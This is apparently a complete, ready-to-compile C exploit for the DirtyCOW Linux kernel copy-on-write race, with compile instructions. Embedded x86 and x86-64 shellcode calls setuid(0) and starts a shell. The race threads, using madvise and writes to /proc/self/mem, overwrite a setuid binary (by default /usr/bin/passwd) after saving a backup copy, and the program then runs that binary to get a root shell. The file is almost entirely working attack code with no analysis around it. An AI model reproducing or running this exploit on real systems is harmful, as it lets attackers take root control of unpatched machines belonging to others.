/* Compile with:
 * gcc -o dirtycow dirtycow.c -lpthread -Wall
 * DirtyCOW Exploit Priviledge escalation
 * AUTHOR: Mester
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

int stop = 0;

#if __x86_64__
// 64 bits version
unsigned char sc[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
  0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,
  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
};
unsigned int sc_len = 177;
#else
// 32 bits version
unsigned char sc[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,
  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,
  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
  0x89, 0xe1, 0xcd, 0x80
};
unsigned int sc_len = 136;
#endif

void *madviseThread ( void *map ) {

  while ( !stop ) {
    madvise (map, sc_len, MADV_DONTNEED);
  }

 return NULL;
}

void *memThread ( void *arg ) {
  int mem;

  if ( (mem = open ( "/proc/self/mem", O_RDWR )) < 0 ) {
    perror ( "Error reading memory map\n" );
    return NULL;
  }

  while ( !stop ) {
    lseek ( mem, (off_t)arg, SEEK_SET );
    write ( mem, sc, sc_len );
  }

  close ( mem );

 return NULL;
}

size_t copyfile (const char *sfile,
                  const char *dstfile) {
  int sf, dst;
  size_t sby, rd = 1024, wr = 0, bytes = 0;
  char buf[1024];
  struct stat st;


  if ( (sf = open ( sfile, O_RDONLY )) < 0 )
    return 0;

  if ( fstat ( sf, &st ) < 0 )
    return 0;
  sby = st.st_size;

  if ( (dst = open ( dstfile,
                       O_WRONLY | O_CREAT,
		         st.st_mode )) < 0 )
      return 0;

  for ( ;sby; bytes += wr ) {
    if ( sby < rd )
      rd = sby;
    wr = read ( sf, buf, rd );

    if ( write ( dst, buf, wr ) != wr )
      return 0;
    else sby -= wr;
  }

  close ( sf );

 return bytes;  
}

int main (int argc, char **argv) {
  void *map;
  int p = 0, vuln = 0, dPrg = 0;
  char buf[sc_len + 1];
  char *prg = "/usr/bin/passwd", *prgbk = "/tmp/aWtjdX";
  pthread_t pt[2];
  struct stat st;

  printf ("%s <binary> <backup>\n", argv[0]);

  if (argc > 2)
    prg = argv[1], prgbk = argv[2];
  else if (argc > 1)
    prg = argv[1];

  if ( !copyfile ( (const char *)prg, (const char *)prgbk ) ) {
    perror ( "Error creating the backup\n" );
    return -1;
  }

  printf ( "%s -> %s\n", prg, prgbk );

  if ( (dPrg = open ( prg, O_RDONLY )) < 0 ) {
    fprintf ( stderr, "%s: %s", prg, strerror ( errno ) );
    return -1;
  }

  if ( fstat ( dPrg, &st ) < 0 ) {
    fprintf ( stderr, "%s: %s\n", prg, strerror ( errno ) );
    return -1;
  }

  if ( (map = mmap ((void *)0, st.st_size,
                PROT_READ, MAP_PRIVATE, dPrg, 0 )) == MAP_FAILED ) {
    perror ( "Cannot open a memory map of file\n" );
    return -1;
  }

  pthread_create ( &pt[0], (void *)0, (void *)&madviseThread, map );
  pthread_create ( &pt[1], (void *)0, (void *)&memThread, map );

  for ( p = 0; p < 20; p++ ) {
    memset ( buf, 0, sc_len );

    read ( dPrg, buf, sc_len );
    lseek ( dPrg, (off_t)0, SEEK_SET );

    if ( !memcmp ( buf, sc, sc_len ) ) {
      printf ( "Explo%dt executed successfully\n", ++vuln );
      break;
    }

    sleep ( 1 );
  }
          
  stop = 1;
  close ( dPrg );

  if (vuln)
    system ( prg );
  else
    return fprintf ( stderr, "System is not vulnerable\n" );

 return 0;
}
